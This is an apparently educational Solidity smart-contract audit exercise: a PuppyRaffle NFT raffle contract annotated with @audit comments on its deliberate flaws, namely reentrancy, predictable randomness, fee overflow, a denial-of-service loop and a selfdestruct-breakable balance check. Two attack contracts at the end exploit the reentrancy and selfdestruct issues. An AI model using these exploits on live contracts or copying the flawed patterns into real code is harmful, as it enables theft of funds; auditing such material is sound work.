// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
// @audit-info using floating pragma is not recommended

import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {Base64} from "lib/base64/base64.sol";

/// @title PuppyRaffle
/// @author PuppyLoveDAO
/// @notice This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:
/// 1. Call the `enterRaffle` function with the following parameters:
///    1. `address[] participants`: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
/// 2. Duplicate addresses are not allowed
/// 3. Users are allowed to get a refund of their ticket & `value` if they call the `refund` function
/// 4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
/// 5. The owner of the protocol will set a feeAddress to take a cut of the `value`, and the rest of the funds will be sent to the winner of the puppy.
contract PuppyRaffle is ERC721, Ownable {
    using Address for address payable;

    uint256 public immutable entranceFee;

    address[] public players;
    // mapping(address => bool) public activePlayers;
    
    // @audit-gas could be immutable (set only once in the constructor)
    uint256 public raffleDuration;
    uint256 public raffleStartTime;
    address public previousWinner;

    // We do some storage packing to save gas
    address public feeAddress;
    uint64 public totalFees = 0;

    // mappings to keep track of token traits
    mapping(uint256 => uint256) public tokenIdToRarity;
    mapping(uint256 => string) public rarityToUri;
    mapping(uint256 => string) public rarityToName;

    // Stats for the common puppy (pug)
    // @audit-gas should be constant 
    string private commonImageUri = "ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8";
    uint256 public constant COMMON_RARITY = 70;
    string private constant COMMON = "common";

    // Stats for the rare puppy (st. bernard)
    // @audit-gas should be constant 
    string private rareImageUri = "ipfs://QmUPjADFGEKmfohdTaNcWhp7VGk26h5jXDA7v3VtTnTLcW";
    uint256 public constant RARE_RARITY = 25;
    string private constant RARE = "rare";

    // Stats for the legendary puppy (shiba inu)
    // @audit-gas should be constant
    string private legendaryImageUri = "ipfs://QmYx6GsYAKnNzZ9A6NvEKV9nf1VaDzJrqDR23Y8YSkebLU";
    uint256 public constant LEGENDARY_RARITY = 5;
    string private constant LEGENDARY = "legendary";

    // Events
    event RaffleEnter(address[] newPlayers);
    event RaffleRefunded(address player);
    event FeeAddressChanged(address newFeeAddress);

    /// @param _entranceFee the cost in wei to enter the raffle
    /// @param _feeAddress the address to send the fees to
    /// @param _raffleDuration the duration in seconds of the raffle
    constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
        entranceFee = _entranceFee;
        // @audit-info check if _feeAddress is not a zero address
        feeAddress = _feeAddress;
        raffleDuration = _raffleDuration;
        raffleStartTime = block.timestamp;

        rarityToUri[COMMON_RARITY] = commonImageUri;
        rarityToUri[RARE_RARITY] = rareImageUri;
        rarityToUri[LEGENDARY_RARITY] = legendaryImageUri;

        rarityToName[COMMON_RARITY] = COMMON;
        rarityToName[RARE_RARITY] = RARE;
        rarityToName[LEGENDARY_RARITY] = LEGENDARY;
    }

    /// @notice this is how players enter the raffle
    /// @notice they have to pay the entrance fee * the number of players
    /// @notice duplicate entrants are not allowed
    /// @param newPlayers the list of players to enter the raffle
    function enterRaffle(address[] memory newPlayers) public payable {
        // q what if newPlayers array is 0 ?
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            // Check for duplicates (new way to check for duplicates)
            // require(!activePlayers[newPlayers[i]], "PuppyRaffle: Duplicate player");
            players.push(newPlayers[i]);
            // activePlayers[newPlayers[i]] = true;
        }

        // Check for duplicates
        // @audit - DOS(Denial Of Service) Attack vector
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }

        // q we still emit an event if the newPlayers array is empty ?
        emit RaffleEnter(newPlayers);
    }

    /// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`
    /// @dev This function will allow there to be blank spots in the array

    // @audit - Reentrancy vulnerability 
    // q How to fix that ?
    // 1. Follow CEI (Checks, Effects, Interactions) pattern
    // 2. Use openzeppelin RecentrancyGuard nonReentrant modifier or implement it yourself by using a boolean variable
    function refund(uint256 playerIndex) public {
        // Checks (meaning require or revert statements)
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
        
        // Interactions (interacting with other contracts)

        // calls payable(msg.sender).call{ value: entranceFee }(""); which sends the entranceFee to the player
        payable(msg.sender).sendValue(entranceFee);

        // Effects (updating state variables)
        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }

    /// @notice a way to get the index in the array
    /// @param player the address of a player in the raffle
    /// @return the index of the player in the array, if they are not active, it returns 0
    function getActivePlayerIndex(address player) external view returns (uint256) {
        // @audit-gas use cache variable for players length -> uint256 playersLength = players.length;
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        // q what if player is at index 0
        // @audit if the player is at index 0, it will return 0 and the player might think they are not active
        return 0;
    }

    /// @notice this function will select a winner and mint a puppy
    /// @notice there must be at least 4 players, and the duration has occurred
    /// @notice the previous winner is stored in the previousWinner variable
    /// @dev we use a hash of on-chain data to generate the random numbers
    /// @dev we reset the active players array after the winner is selected
    /// @dev we send 80% of the funds to the winner, the other 20% goes to the feeAddress
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        // @audit randomness is not secure
        // note Do not use block.timestamp, now or blockhash as a source of randomness
        // Fixes: Use Chainlink VRF, Commit-Reveal Scheme, or other secure randomness sources
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        // q why don't you use address(this).balance instead of players.length * entranceFee ?
        uint256 totalAmountCollected = players.length * entranceFee; // 94e18 if 94 players enter the raffle

        // @audit-info magic numbers (use constants instead of hardcoding numbers)
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100; // 18.8e18 > max uint64 (18e18)

        // @audit arithmetic overflow
        // @audit unsafe cast of uint256 to uint64 (possible truncation)
        totalFees = totalFees + uint64(fee);

        uint256 tokenId = totalSupply();

        // We use a different RNG calculate from the winnerIndex to determine rarity
        // @audit randomness is not secure
        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
        // pick the rarity of the puppy
        if (rarity <= COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
        } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }

        // reset the players array
        delete players;
        // reset the raffle start time
        raffleStartTime = block.timestamp;
        // set the winner
        previousWinner = winner;
        (bool success,) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
    }

    function getPlayersCount() external view returns (uint256) {
        return players.length;
    }

    /// @notice this function will withdraw the fees to the feeAddress
    function withdrawFees() external {
        // ... sus ???
        // @audit Mishandling of ETH !!!
        // POSSIBLE SCENARIO: An attack contract can selfdescruct() and send all the ETH to our PuppyRaffle contract which will break the withdrawFees function
        // so nobody will be able to withdraw the fees - `address(this).balance == uint256(totalFees)` will never be true
        require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }

    /// @notice only the owner of the contract can change the feeAddress
    /// @param newFeeAddress the new address to send fees to
    function changeFeeAddress(address newFeeAddress) external onlyOwner {
        feeAddress = newFeeAddress;
        // q are we missing events somewhere ?
        emit FeeAddressChanged(newFeeAddress);
    }

    /// @notice this function will return true if the msg.sender is an active player
    // @audit this function is internal but not used anywhere
    // IMPACT: None
    // LIKELIHOOD: None
    // ...but it's a waste of gas I/G
    function _isActivePlayer() internal view returns (bool) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == msg.sender) {
                return true;
            }
        }
        return false;
    }

    /// @notice this could be a constant variable
    function _baseURI() internal pure returns (string memory) {
        return "data:application/json;base64,";
    }

    /// @notice this function will return the URI for the token
    /// @param tokenId the Id of the NFT
    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
        require(_exists(tokenId), "PuppyRaffle: URI query for nonexistent token");

        uint256 rarity = tokenIdToRarity[tokenId];
        string memory imageURI = rarityToUri[rarity];
        string memory rareName = rarityToName[rarity];

        return string(
            abi.encodePacked(
                _baseURI(),
                Base64.encode(
                    bytes(
                        abi.encodePacked(
                            '{"name":"',
                            name(),
                            '", "description":"An adorable puppy!", ',
                            '"attributes": [{"trait_type": "rarity", "value": ',
                            rareName,
                            '}], "image":"',
                            imageURI,
                            '"}'
                        )
                    )
                )
            )
        );
    }
}

// Showing Reentrancy Vulnerability
contract AttackerContract {
    PuppyRaffle puppyRaffle;
    uint256 attackerIndex;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
    }

    function attack() public payable {
        // Create players array
        address[] memory players = new address[](1);
        players[0] = address(this);

        // Enter the raffle
        puppyRaffle.enterRaffle{ value: puppyRaffle.entranceFee() }(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        
        // Refund the entrance fee to the attacker
        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if (address(puppyRaffle).balance > 0) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}

contract SelfDestruct {
    PuppyRaffle puppyRaffle;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
    }

    function attack() public payable {
        selfdestruct(payable(address(puppyRaffle)));
    }
    
    receive() external payable {}
}
